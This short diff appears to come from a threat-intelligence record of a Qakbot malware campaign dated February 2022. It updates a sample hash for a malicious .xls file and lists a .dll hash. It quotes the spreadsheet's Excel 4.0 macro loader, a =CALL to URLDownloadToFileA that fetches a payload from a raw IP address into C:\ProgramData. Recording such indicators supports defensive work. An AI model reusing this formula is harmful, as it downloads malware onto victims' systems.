@@ -2,7 +2,7 @@ Qakbot | 15.02.2022 | obama156 | 1645009013 |
 
 ************************************************************************************************************
 
-.xls d91a7c07bec1136e7117642acd349bdbc7e21cdb4abf1eda8914dac94d5eb0f9
+.xls 89d5eff74023abd1d6e46fbe80d1644b2e0aadc2939ad9d1d1a0f440a1f1ccdf
 .dll 214242371456bed0d743014aacf3086899f73cfea111fb2bdcfa1da6355cce46
 
 =CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "http://193.42.36.228/1872177917125510.dat", "C:\ProgramData\Hroser1.ocx")
